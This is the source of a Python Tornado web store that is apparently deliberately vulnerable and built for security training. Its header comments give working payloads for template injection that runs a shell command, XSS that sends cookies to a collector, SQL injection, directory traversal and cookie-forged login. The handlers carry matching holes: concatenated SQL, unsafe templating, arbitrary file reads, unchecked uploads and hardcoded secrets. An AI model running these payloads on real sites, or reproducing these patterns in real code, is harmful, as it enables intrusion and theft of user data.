# Author: JT Hamrick
# design based off of http://chrisdianamedia.com/simplestore/

# -- template injection
# http://localhost:8888/welcome/%7B%import%20os%%7D%7B%7Bos.popen(%22whoami%22).read()%7D%7D

# -- XSS cookie theft
# http://localhost:8888/details/2%3Cscript%3Evar%20img%20%3D%20document.createElement%28%22IMG%22%29%3B%20img.src%20%3D%20%22http%3A%2F%2Flocalhost%3A8889%2F%22%20%2B%20btoa%28document.cookie%29%3B%20%24%28%27body%27%29.append%28img%29%3B%20%3C%2Fscript%3E

# -- SQL injection
# cart page - webstore_cookie=666' OR '1'='1
# login form

# -- directory traversal
# http://localhost:8888/directory/class_website.py

# -- bad authorized page security
# set cookie loggedin to numerical value and you can access secure pages
# /account & /secretpage
# can edit user information if logged in cookie number
#   matches id in auth table in database

import os.path
import tornado.ioloop
import tornado.web
from tornado.options import define, options
from tornado import gen
import tornado.template
import MySQLdb
import uuid
import urllib
import re
import magic
from bcrypt import hashpw
# import HTMLParser

# define values for mysql connection
define("port", default=8888, help="run on the given port", type=int)
define("mysql_host", default="127.0.0.1", help="database host")
define("mysql_port", default=3306, help="database port", type=int)
define("mysql_database", default="class_website", help="database name")
define("mysql_user", default="root", help="database user")
define("mysql_password", default="", help="database password")

__UPLOADS__ = "static/uploads/"


class Application(tornado.web.Application):
    def __init__(self):
        handlers = [
            (r"/", HomeHandler),
            (r"/details/([^/]+)", DetailsHandler),
            (r"/cart", CartHandler),
            (r"/product/add", AddToCartHandler),
            (r"/product/remove/([^/]+)", RemoveFromCartHandler),
            (r"/cart/empty", EmptyCartHandler),
            (r"/upload", UploadHandler),
            (r"/userform", UserformHandler),
            (r"/welcome/([^/]+)", WelcomeHandler),
            (r"/directory/([^/]+)", DirectoryTraversalHandler),
            (r"/auth/create", AuthCreateHandler),
            (r"/auth/login", AuthLoginHandler),
            (r"/auth/logout", AuthLogoutHandler),
            (r"/secretpage", SecretPageHandler),
            (r"/account", AccountHandler),
            (r"/account/update", AccountUpdateHandler),
            (r"/auth_error", AuthErrorHandler)
        ]
        settings = dict(
            template_path=os.path.join(os.path.dirname(__file__), "templates"),
            static_path=os.path.join(os.path.dirname(__file__), "static"),
            ui_modules={"Small": SmallModule},
            xsrf_cookies=False,
            debug=True,
            cookie_secret="2Xs2dc.y2wqZVB,qRrnyoZuWbUTnjRBG4&uxaMYtM&r%KnpL7e",
            login_url="/auth/login",
            salt=b"$2a$12$w40nlebw3XyoZ5Cqke14M."
        )
        super(Application, self).__init__(handlers, **settings)
        # Have one global connection to the store DB across all handlers
        self.myDB = MySQLdb.connect(host=options.mysql_host,
                                    port=options.mysql_port,
                                    db=options.mysql_database,
                                    user=options.mysql_user,
                                    passwd=options.mysql_password)


class BaseHandler(tornado.web.RequestHandler):
    @property
    def db(self):
        return self.application.myDB

    # if there is no cookie for the current user generate one
    def get_current_user(self):
        if not self.get_cookie("webstore_cookie"):
            self.set_cookie("webstore_cookie", str(uuid.uuid4()))


class HomeHandler(BaseHandler):
    def get(self):
        # get all products in the database for the store's main page
        temp = []
        c = self.db.cursor()
        c.execute("SELECT * FROM products")
        products = c.fetchall()
        # add urlencoded string to tuple for product image link
        for k, v in enumerate(products):
            temp.append(products[k] + (urllib.quote_plus(products[k][2]),))

        authorized = self.get_cookie("loggedin")
        self.render("home.html", products=tuple(temp), auth=authorized)


class SecretPageHandler(BaseHandler):
    def get(self):
        if not self.get_cookie("loggedin"):
            # if not logged in present user with error page
            self.render("login.html")
        else:
            # if logged in send user to secret page
            self.render("secret.html")


class AccountHandler(BaseHandler):
    def get(self):
        if not self.get_cookie("loggedin"):
            # if not logged in present user with error page
            self.render("login.html")
        else:
            c = self.db.cursor()
            c.execute("SELECT * FROM auth WHERE id = " + self.get_cookie("loggedin"))

            # get the user information
            account_results = c.fetchall()
            # if logged in send user to account info page
            self.render("account.html", user_info=account_results)


class AccountUpdateHandler(BaseHandler):
    def post(self):
        if not self.get_cookie("loggedin"):
            # if not logged in present user with error page
            self.render("login.html")
        else:
            # UPDATE ACCOUNT INFORMATION IN THE DATABASE
            user = self.get_cookie("loggedin")
            c = self.db.cursor()
            c.execute("UPDATE auth SET `email`='" + self.get_argument("email") + "', `name`='" + self.get_argument("name") + "', `address`='" + self.get_argument("address") + "', `city`='" + self.get_argument("city") + "', `state`='" + self.get_argument("state") + "', `zip`=" + self.get_argument("zip") + " WHERE id = '" + user + "'")
            self.application.myDB.commit()
            self.redirect("/account")


class AuthLoginHandler(BaseHandler):
    def get(self):
        self.render("login.html")

    @gen.coroutine
    def post(self):
        entered_pass = self.get_argument("password").encode('utf-8')
        hashed_password = hashpw(entered_pass, self.settings['salt'])

        c = self.db.cursor()
        account = c.execute("SELECT * FROM auth WHERE email = '" + self.get_argument("username") + "' AND hashed_password = '" + hashed_password + "'")

        # get the user information
        account_results = c.fetchall()
        if str(account) == "0":
            self.redirect("/auth_error")
            return
        else:
            self.set_cookie("loggedin", str(account_results[0][0]))
            self.render("account.html", user_info=account_results)


class AuthCreateHandler(BaseHandler):
    def get(self):
        self.render("create.html")

    @gen.coroutine
    def post(self):
        entered_pass = self.get_argument("password").encode('utf-8')
        hashed_password = hashpw(entered_pass, self.settings['salt'])

        c = self.db.cursor()
        c.execute("INSERT INTO auth (id, email, hashed_password) VALUES (0, '" + self.get_argument("username") + "', '" + hashed_password + "')")
        self.application.myDB.commit()

        self.set_cookie("loggedin", str(c.lastrowid))
        self.redirect("/account")


class AuthLogoutHandler(BaseHandler):
    def get(self):
        self.clear_cookie("loggedin")
        self.redirect("/auth/login")


class DetailsHandler(BaseHandler):
    def get(self, slug):
        # get the selected product from the database
        temp = []
        # remove non numerical characters from slug
        item_number = re.findall(r'\d+', slug)
        c = self.db.cursor()
        c.execute("SELECT * \
                   FROM products p \
                   LEFT JOIN (SELECT `option`, \
                                     GROUP_CONCAT(`value`) AS `value`, \
                                     product_id \
                         FROM `product_options` \
                         WHERE `product_id` = " + item_number[0] + " \
                         GROUP BY `option`) AS o ON o.product_id = p.id \
                   WHERE p.id = " + item_number[0])
        product = c.fetchall()
        # add urlencoded string to tuple for product image link
        quoted_url = urllib.quote_plus(urllib.quote_plus(product[0][2]))
        temp.append(product[0] + (quoted_url,))

        authorized = self.get_cookie("loggedin")
        self.render("details.html",
                    product=tuple(temp),
                    sku=slug,
                    auth=authorized)


class CartHandler(BaseHandler):
    def get(self):
        # get the current user's cookie
        cookie = self.get_cookie("webstore_cookie")
        # get the current user's cart based on their cookie
        c = self.db.cursor()
        c.execute("SELECT c.item, \
                          p.price, \
                          p.name, \
                          COUNT(*) AS quantity, \
                          SUM(p.price) AS subtotal, \
                          `options`, \
                          GROUP_CONCAT(c.id) AS `id` \
                   FROM cart c \
                   INNER JOIN products p on p.id = c.item \
                   WHERE c.user_cookie = '" + cookie + "' \
                   GROUP BY c.item, c.options")
        products = c.fetchall()
        # calculate total and tax values for cart
        total = int(sum([x[4] for x in products]))
        count = sum([x[3] for x in products])
        tax = float("{0:.2f}".format(total * 0.08517))
        shipping = 5.27

        authorized = self.get_cookie("loggedin")
        self.render("cart.html",
                    products=products,
                    total=total,
                    count=count,
                    shipping=shipping,
                    tax=tax,
                    auth=authorized)


class AddToCartHandler(BaseHandler):
    def post(self):
        # get the product information from the details page
        id = self.get_argument("product", None)
        cookie = self.get_cookie("webstore_cookie")
        product_options = ",".join(self.get_arguments("option"))
        # add the product to the user's cart
        c = self.db.cursor()
        c.execute("INSERT INTO cart (id, user_cookie, item, options) \
                   VALUES (0, '"+cookie+"', "+id+", '"+product_options+"')")
        self.application.myDB.commit()
        self.redirect("/cart")


class RemoveFromCartHandler(BaseHandler):
    def get(self, slug):
        # get the current user's cookie
        cookie = self.get_cookie("webstore_cookie")
        # use that cookie to remove selected item from the user's cart
        c = self.db.cursor()
        c.execute("DELETE FROM cart \
                   WHERE user_cookie = '" + cookie + "'  \
                       AND id IN(" + slug + ")")
        self.application.myDB.commit()
        self.redirect("/cart")


class EmptyCartHandler(BaseHandler):
    def get(self):
        # get the current user's cookie
        cookie = self.get_cookie("webstore_cookie")
        # use that cookie to remove all items from user's cart
        c = self.db.cursor()
        c.execute("DELETE FROM cart WHERE user_cookie = '" + cookie + "'")
        self.application.myDB.commit()
        self.redirect("/cart")


class WelcomeHandler(BaseHandler):
    def get(self, name):
        TEMPLATE = open("templates/welcome.html").read()
        template_data = TEMPLATE.replace("FOO", name)
        t = tornado.template.Template(template_data)
        self.write(t.generate(name=name))


class UserformHandler(tornado.web.RequestHandler):
    def get(self):
        self.render("fileuploadform.html")


class UploadHandler(tornado.web.RequestHandler):
    def post(self):
        fileinfo = self.request.files['filearg'][0]
        fname = fileinfo['filename']
        # extn = os.path.splitext(fname)[1]
        # cname = str(uuid.uuid4()) + extn
        fh = open(__UPLOADS__ + fname, 'w')
        fh.write(fileinfo['body'])
        self.finish(fname + " is uploaded!! Check %s folder" % __UPLOADS__)
        # self.write(fileinfo)


class DirectoryTraversalHandler(BaseHandler):
    def get(self, slug):
        mime = magic.Magic(mime=True)
        filename = urllib.unquote(urllib.unquote(slug))
        mime_type = mime.from_file(filename)
        self.set_header('Content-Type', mime_type)
        with open(filename) as f:
            self.write(f.read())


class AuthErrorHandler(BaseHandler):
    def get(self):
        self.render("auth_error.html")


class SmallModule(tornado.web.UIModule):
    def render(self, item):
        return self.render_string("modules/small.html", item=item)


def main():
    http_server = tornado.httpserver.HTTPServer(Application())
    http_server.listen(options.port)
    tornado.ioloop.IOLoop.current().start()


if __name__ == "__main__":
    main()
